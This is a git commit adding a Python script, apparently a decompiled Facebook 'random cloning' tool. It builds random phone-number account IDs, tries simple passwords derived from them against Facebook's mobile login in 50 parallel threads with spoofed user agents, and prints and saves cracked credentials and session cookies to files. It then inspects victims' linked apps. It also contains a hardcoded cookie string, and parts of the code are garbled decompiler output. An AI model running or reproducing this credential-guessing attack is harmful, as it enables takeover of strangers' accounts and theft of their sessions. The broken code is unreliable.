f826c3ea88580293e2536f0a3df499cfb47b96ca
BDYTGALIBbbb <150205048+ggujnhuuu5579@users.noreply.github.com>
2023-11-16 10:59:13 +0600

    Add files via upload

---
+++ Andi_ Kola2.py
@@ -0,0 +1,312 @@
+#Decompile by Mardis (Tools By Hridoy)
+# Time Succes decompile : 2023-03-01 06:48:38.657478
+
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        else:
+            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://m.facebook.com/groups/255569800498915', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+          
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,xr,u,b])
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+os.system('xdg-open https://m.facebook.com/groups/185251017996915/')
+logo = ("""
+    
+ \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
+ \033[1;93m║     \033[1;96m[✓] develop BY\33[0;m   : \033[1;96m Shohag-Khan     \033[1;32m║
+ \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Cyber.Army00      \033[1;32m║
+ \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mAmi-Akhon-dimu.na        \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈       \033[1;32m ║
+ \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35     🆃🅰🆁🅼🆄🆇 🆄🆂🅴🆁 \033[1;32m ║
+ \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m2.0                  \033[1;32m ║
+ \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
+ \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....                 \033[1;32m  ║
+ \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m Cyber.Army00....          \033[1;32m ║
+ \033[1;93m╚═════════════════[\033[1;93m CYBER - Army \033[1;32m]══════════════╝""")
+def linex():
+	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
+loop = 0
+oks = []
+cps = []
+def clear():
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/Cyber.Army00/')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+ugen2=[]
+ugen=[]
+ 
+for sn in range(7000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['5.1.1','6.0.1','7.1.1','8','9','10','11','12','13','14','15'])
+	c=random.choice(['SM-J320H','SM-J3109','SM-J320FN','SM-J320P','SM-J320F','SM-J320M','SM-J320Y','SM-J320A','SM-J320G','SM-J327T1','SM-J320V','SM-J320YZ','SM-J320W8','SM-J320ZN','SM-J320N0','SM-J320R4'])
+	d='Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	e=random.randrange(70,175)
+	f='0'
+	g=random.randrange(4000,8000)
+	h=random.randrange(50,250)
+	i='Mobile Safari/537.36'
+	ug=(f"{a} {b}; {c} {d} {e}.{f}.{g}.{h} {i}")
+	ugen.append(ug)
+    
+
+def samiya(uid):
+    if len(uid)==15:
+        if uid[:10] in ['1000000000']       :riddu = ' (*-*) 2009'
+        elif uid[:9] in ['100000000']       :riddu = '√ 2009'
+        elif uid[:8] in ['10000000']        :riddu = '√ 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:riddu = '√ 2009'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:riddu = ' 2010'
+        elif uid[:6] in ['100001']          :riddu = '√ 2010/2011'
+        elif uid[:6] in ['100002','100003'] :riddu = '√ 2011/2012'
+        elif uid[:6] in ['100004']          :riddu = '√ 2012/2013'
+        elif uid[:6] in ['100005','100006'] :riddu = '√ 2013/2014'
+        elif uid[:6] in ['100007','100008'] :riddu = '√ 2014/2015'
+        elif uid[:6] in ['100009']          :riddu = '√ 2015'
+        elif uid[:5] in ['10001']           :riddu = '√ 2015/2016'
+        elif uid[:5] in ['10002']           :riddu = '√ 2016/2017'
+        elif uid[:5] in ['10003']           :riddu = '√ 2018/2019'
+        elif uid[:5] in ['10004']           :riddu = '√ 2019/2020'
+        elif uid[:5] in ['10005']           :riddu = '√ 2020'
+        elif uid[:5] in ['10006','10007','']:riddu = '√ 2021'
+        elif uid[:5] in ['10008']           :riddu = '√ 2022'
+        elif uid[:5] in ['10009']           :riddu = '√ 2023'
+        else:riddu=''
+    elif len(uid) in [9,10]:
+        riddu = ' √ 2008/2009'
+    elif len(uid)==8:
+        riddu = '√ 2007/2008'
+    elif len(uid)==7:
+        riddu = '√ 2006/2007'
+    else:riddu=''
+    return riddu
+    
+    
+    
+def riddu():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,016{x}')
+    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
+    rk1 = '0191'
+    rk2 = '0172'
+    rk3 = '0165'
+    code = random.choice([rk1,rk2,rk3])                      
+    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
+    os.system('clear')
+    print(logo)
+    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 10000, 20000, 50000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = 0
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
+        print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m SHOHAG KHAN')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Tool Work = wifi+Data ')
+        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            
+            header_freefb = {"authority: m.facebook.com' 
+    "method": 'GET',
+    "scheme": 'https',
+   'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' 
+   'accept-language: en-AT,en-GB;q=0.9,en-US;q=0.8,en;q=0.7' 
+   'cache-control: max-age=0' 
+   'cookie: datr=M3VVZaGO_nDtHRigGuQv3ZGb; sb=M3VVZZzjDnxmR-LThw7C2YS_; locale=en_US; wl_cbv=v2%3Bclient_version%3A2360%3Btimestamp%3A1700099805; vpd=v1%3B734x384x1.875; m_pixel_ratio=1.875; wd=384x734; fr=0tRA9GTkPvj3M1wzw.AWUXvJeIU-FHChUuu7Am0Msveo8.BlVXUz.32.AAA.0.0.BlVZuh.AWX6n1StOcg' 
+   'dpr: 1.875' 
+   'sec-ch-prefers-color-scheme: light' 
+   'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"' 
+   'sec-ch-ua-full-version-list: "Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"' 
+   'sec-ch-ua-mobile: ?1' 
+   'sec-ch-ua-model: "V22s"' 
+   'sec-ch-ua-platform: "Android"' 
+   'sec-ch-ua-platform-version: "13.0.0"' 
+   'sec-fetch-dest: document' 
+   'sec-fetch-mode: navigate' 
+   'sec-fetch-site: none' 
+   'sec-fetch-user: ?1' 
+   'upgrade-insecure-requests: 1' 
+   'user-agent:pro,
+   'viewport-width: 980',
+}
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[Cyber-OK❤️‍] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/Cyber-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\r\r\33[1;35m [CYBER-CP❤️‍🔥] ' +uid+ ' | ' +ps+           '  \33[0;95m')
+                open('/sdcard/Cyber-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\r%s {x}[{xr}Cyber{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+
+
+riddu()
+      
